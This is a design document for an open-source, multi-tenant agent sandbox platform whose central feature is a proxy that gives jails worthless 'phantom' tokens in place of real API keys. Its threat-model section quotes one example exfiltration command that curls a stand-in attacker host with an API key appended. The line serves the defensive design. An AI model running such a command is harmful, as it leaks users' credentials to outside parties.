# agentjail-cloud — Open-Source Freestyle Competitor

Design doc for turning the existing `agentjail` sandbox crate into a hosted,
multi-tenant platform that competes with [freestyle.sh] in the *pen* (sandbox
+ agent runtime) area. The unique angle is a **phantom-token egress proxy**:
no real API credentials ever reach the jail.

[freestyle.sh]: https://www.freestyle.sh

---

## 1. What freestyle sells today

| Product       | What it is                                              |
|---------------|---------------------------------------------------------|
| Runs          | V8 isolate, per-ms billed, `code` in request            |
| VMs           | Full Linux KVM, root, Docker-in-VM, fork in ms          |
| Dev Server    | (Deprecated Mar 2026, folded into VMs)                  |
| Deployments   | Ship agent-built apps from a VM                         |
| Git Identity  | Managed git per-session                                 |

Pricing: $500/mo Pro + usage (vCPU-hour, GiB-hour, storage-GiB-hour).

## 2. What we already have (this repo)

- Rootless Linux sandbox via user namespaces (`crates/agentjail`)
- Network isolation: `None | Loopback | Allowlist(Vec<DomainPattern>)`
- Built-in CONNECT proxy in parent netns (`src/proxy.rs`)
- Seccomp, cgroups v2, landlock, no-new-privs, RLIMIT_CORE=0
- **Live forking** via `FICLONE` (the exact freestyle-style "fork in ms")
- Snapshotting, event streaming, GPU passthrough, TUI, CLI

Gap to ship a platform: HTTP API, auth, multi-tenant scheduler, web UI, SDK,
and — the thing we actually win on — **phantom-token proxy**.

## 3. Threat model we beat

Agents running untrusted LLM-generated code need outbound access to model
providers (OpenAI, Anthropic), package registries, and databases. Giving
them real API keys means:

- Prompt injection exfiltrates keys via `curl attacker.com?k=$OPENAI_API_KEY`
- Generated code embeds keys in output artifacts
- A compromised package inside the jail reads env/memory

**Phantom-token invariant:** the real key is in the host's keyring or an
env outside the jail. The jail only ever sees a random
`phm_<64hex>` token that is *worthless* off-proxy and revoked at session
end. Even a full jail escape to the veth peer only gets phantom tokens.

## 4. Architecture

```
┌────────────────────────── host ────────────────────────────┐
│                                                            │
│  ┌───────────────┐  HTTPS  ┌──────────────────────────┐    │
│  │ control plane │ ──────► │ upstream providers       │    │
│  │ (API + UI)    │         │ (openai, anthropic, gh…) │    │
│  └──────┬────────┘         └──────────────────────────┘    │
│         │ spawn + events                ▲                  │
│         ▼                                │ TLS w/ real key │
│  ┌───────────────┐                       │                 │
│  │ agentjail     │    veth0 ──► veth1 ──►│ phantom proxy   │
│  │ (namespaces,  │              │        │ (TLS term +     │
│  │  seccomp,…)   │              │        │  header inject) │
│  └──────┬────────┘              │        └─────────────────┘
│         │ child                 │                          │
│         ▼                       │ only phm_ tokens on wire │
│  ┌─────────────── jail ─────────┴────┐                     │
│  │ OPENAI_API_KEY=phm_…              │                     │
│  │ OPENAI_BASE_URL=http://10.0.0.1/  │                     │
│  │   v1/openai                       │                     │
│  │ (no real secrets in env/fs/mem)   │                     │
│  └───────────────────────────────────┘                     │
└────────────────────────────────────────────────────────────┘
```

### 4.1 Phantom-token proxy (new crate: `crates/agentjail-phantom`)

Today's `src/proxy.rs` is **CONNECT-only** — a pure TCP tunnel. Phantom
injection happens *inside* HTTPS, so we need two modes side-by-side:

| Mode               | Path                   | Use                               |
|--------------------|------------------------|-----------------------------------|
| CONNECT tunnel     | `CONNECT host:443`     | Legacy / opaque TLS (unchanged)   |
| Reverse proxy      | `GET /v1/<svc>/...`    | Phantom injection for known APIs  |

Reverse-proxy mode terminates TLS server-side (proxy is plain HTTP on the
veth peer; traffic never leaves the host unencrypted), then dials the real
upstream over HTTPS with `rustls`. This avoids the MITM-CA dance and keeps
real secrets on the host.

**Provider pack** (first wave):

| Service    | Agent sees                              | Header injected by proxy        |
|------------|-----------------------------------------|---------------------------------|
| OpenAI     | `OPENAI_BASE_URL=.../v1/openai`         | `Authorization: Bearer sk-…`    |
| Anthropic  | `ANTHROPIC_BASE_URL=.../v1/anthropic`   | `x-api-key: sk-ant-…`           |
| GitHub     | `GITHUB_API_URL=.../v1/github`          | `Authorization: token ghp_…`    |
| Stripe     | `STRIPE_API_BASE=.../v1/stripe`         | `Authorization: Bearer sk_…`    |
| Postgres   | `DATABASE_URL=postgres://phm_…@proxy/`  | TLS-wrapped upstream conn       |
| Supabase   | `SUPABASE_URL=…/v1/supabase`            | `apikey` + service-role hdr     |

**Token format:** `phm_` + 32 random bytes, base58 (or hex). Generated with
`getrandom`; never reused; bound to a `session_id` + set of `scopes`
(which upstreams it can reach). Validated with constant-time compare.

**Scope model (per session):**
```rust
pub struct PhantomScope {
    pub service: ServiceId,           // OpenAi, Anthropic, ...
    pub allowed_paths: Vec<PathGlob>, // e.g. "/chat/completions"
    pub rate_limit: Option<RatePolicy>,
    pub redact: bool,                 // strip req/resp from logs
}
```

**Audit log line:**
```
ts=… session=sid_… service=openai method=POST path=/chat/completions
status=200 upstream_ms=413 tok_in=812 tok_out=298 redacted=true
```

The proxy is the **only** thing that sees real keys. Keys live in:
- Dev: `$AGENTJAIL_HOME/keys.toml` (chmod 600) or OS keyring
- Prod: env of the control-plane process, or fetched from Vault / SOPS

### 4.2 Control plane (new crate: `crates/agentjail-ctl`)

Stateless HTTP server (axum) in front of a scheduler that owns a pool of
jails. SQLite for dev, Postgres for prod. Redis optional for pub/sub on
event streams.

### 4.3 Web UI (new `web/` directory)

Next.js 15 + React 19 + tRPC (or just fetch). Pages:
- `/` dashboard (live sessions, live CPU/mem bars from cgroup stats)
- `/sessions/[id]` logs, event stream, fs browser (via `vm.fs.*`)
- `/credentials` add/rotate real keys, see scope + usage
- `/audit` phantom-proxy request log (redactable)
- `/playground` run code right from the browser

All WebSocket streams multiplexed over one `/ws` channel.

### 4.4 TypeScript SDK (new `packages/sdk-node`)

Mirror freestyle's shape so migration is a one-line change. `tsup`-built
ESM+CJS, ships types, zero runtime deps except `undici`.

## 5. Public API

Base URL: `https://<host>/v1`. Auth: `Authorization: Bearer aj_<key>`.

```
POST   /v1/sessions                    create session, returns phantom env
GET    /v1/sessions                    list
GET    /v1/sessions/:id                describe
DELETE /v1/sessions/:id                terminate

POST   /v1/sessions/:id/exec           one-shot command, returns stdout/err
POST   /v1/sessions/:id/spawn          long-running, returns handle
GET    /v1/sessions/:id/events         SSE: stdout/stderr/oom/exit
POST   /v1/sessions/:id/fork           live-fork via FICLONE

POST   /v1/sessions/:id/fs/read        {path} → bytes
POST   /v1/sessions/:id/fs/write       {path, content}
POST   /v1/sessions/:id/fs/ls          {path}

POST   /v1/runs                        freestyle-compatible one-shot run
                                       {code, nodeModules, env, timeoutMs}

POST   /v1/credentials                 attach real key for a service
                                       → returns phantom token + env
DELETE /v1/credentials/:id             revoke (invalidates phantom instantly)

GET    /v1/audit                       paginated phantom-proxy log
```

### 5.1 Request example — create session with phantom creds

```http
POST /v1/sessions
Authorization: Bearer aj_live_…
Content-Type: application/json

{
  "preset": "agent",
  "network": { "mode": "phantom", "services": ["openai", "github"] },
  "memoryMb": 512,
  "timeoutSecs": 600
}
```

Response:
```json
{
  "id": "sess_2aB7…",
  "env": {
    "OPENAI_API_KEY":  "phm_4f3a…",
    "OPENAI_BASE_URL": "http://10.0.0.1:8443/v1/openai",
    "GITHUB_TOKEN":    "phm_9c12…",
    "GITHUB_API_URL":  "http://10.0.0.1:8443/v1/github"
  },
  "expiresAt": "2026-04-16T20:42:00Z"
}
```

The env block is consumed by the SDK and injected into `jail.run(...)`.

## 6. TypeScript SDK sketch

```ts
// packages/sdk-node/src/index.ts
import { Agentjail } from "@agentjail/sdk";

const aj = new Agentjail({ apiKey: process.env.AGENTJAIL_KEY });

// freestyle-compatible: one-shot run
const { stdout } = await aj.runs.create({
  code: `console.log(await (await fetch(process.env.OPENAI_BASE_URL +
    "/chat/completions", { method:"POST", headers:{Authorization:
    "Bearer "+process.env.OPENAI_API_KEY, "content-type":"application/json"},
    body: JSON.stringify({model:"gpt-4o-mini",messages:[{role:"user",
    content:"hi"}]}) })).json());`,
  services: ["openai"],
});

// VM style: long-lived session, fork, fs
const { session } = await aj.sessions.create({
  preset: "dev",
  network: { mode: "phantom", services: ["openai", "github", "npm"] },
});

await session.exec("npm install");
const forks = await session.fork({ count: 3 });
await Promise.all(forks.map(f => f.exec("npm test")));
await session.close();
```

Types are generated from an OpenAPI spec checked into `api/openapi.yaml`.

## 7. Why this wins in "the pen area"

| Capability                      | freestyle | agentjail-cloud |
|---------------------------------|:---------:|:---------------:|
| Rootless Linux namespaces       |    ✅    |       ✅        |
| Live fork (ms, COW)             |    ✅    |       ✅        |
| Phantom-token egress proxy      |    ❌    |       ✅        |
| Network allowlist (domain/path) |   part.  |       ✅        |
| Per-path scope on creds         |    ❌    |       ✅        |
| Self-hostable / on-prem         |    ❌    |       ✅        |
| Open source (MIT)               |    ❌    |       ✅        |
| GPU passthrough                 |    ?     |       ✅        |

The phantom proxy is the headline. The rest is parity we mostly already have.

## 8. Repo layout after work

```
agentjail/
├── crates/
│   ├── agentjail/           (existing: sandbox core)
│   ├── agentjail-cli/       (existing: CLI + TUI)
│   ├── agentjail-phantom/   NEW: reverse-proxy + token store
│   └── agentjail-ctl/       NEW: HTTP API, scheduler, persistence
├── packages/
│   └── sdk-node/            NEW: @agentjail/sdk (TypeScript)
├── web/                     NEW: Next.js admin UI
├── api/
│   └── openapi.yaml         NEW: source of truth for types
└── PLAN.md                  (this file)
```

## 9. Milestones

| M  | Scope                                                             | Days |
|----|-------------------------------------------------------------------|-----:|
| M1 | `agentjail-phantom` crate: OpenAI + Anthropic reverse proxy, unit + integration tests, fuzz on header stripping | 3 |
| M2 | Control plane v0: axum, SQLite, `POST /sessions`, `POST /exec`, SSE events | 4 |
| M3 | TS SDK v0: `sessions.create`, `session.exec`, `session.events`, `runs.create` | 2 |
| M4 | Web UI v0: sessions list + live logs + credentials page           | 4 |
| M5 | Provider pack expansion: GitHub, Stripe, Postgres wire-proxy      | 3 |
| M6 | Multi-tenant auth, audit log UI, rate limits, per-key scopes      | 4 |
| M7 | Docs site, `docker compose up` one-shot, Helm chart               | 3 |

Total: ~23 engineer-days for a shippable v0.1.

## 10. Open questions

1. **TLS in front of the reverse proxy inside the jail.** Plain HTTP over
   the veth is fine because traffic never leaves the host unencrypted, but
   some SDKs refuse non-HTTPS `BASE_URL`. Fix: bind a self-signed cert into
   the jail's `/etc/ssl/certs` and speak HTTPS on the veth too.
2. **Postgres wire protocol.** Injection requires parsing `StartupMessage`
   and swapping the password. Doable but scope-creep for v0.1 — ship HTTP
   providers first, DB in M5.
3. **Streaming rewrites.** OpenAI/Anthropic streaming uses SSE, no
   rewrites needed. Response caching off by default.
4. **Phantom-token revocation latency.** Tokens live in process memory;
   DELETE invalidates instantly. Survives restart via SQLite, checked on
   every proxy request (cheap).
5. **Billing.** Out of scope for OSS core; leave a hook in `agentjail-ctl`
   for a usage emitter (OTel metrics).

## 11. Non-goals (v0.1)

- Deployments / custom domains (freestyle has this; we won't yet)
- V8-isolate Runs backend (our Runs will be agentjail-backed Node runs)
- Hosted control plane at a .com domain — self-host first
- Windows / macOS jails (Linux-only, same as today)

---

*Next step:* land `crates/agentjail-phantom` behind a feature flag, wire
a `Network::Phantom { services }` variant into `JailConfig`, and ship M1.
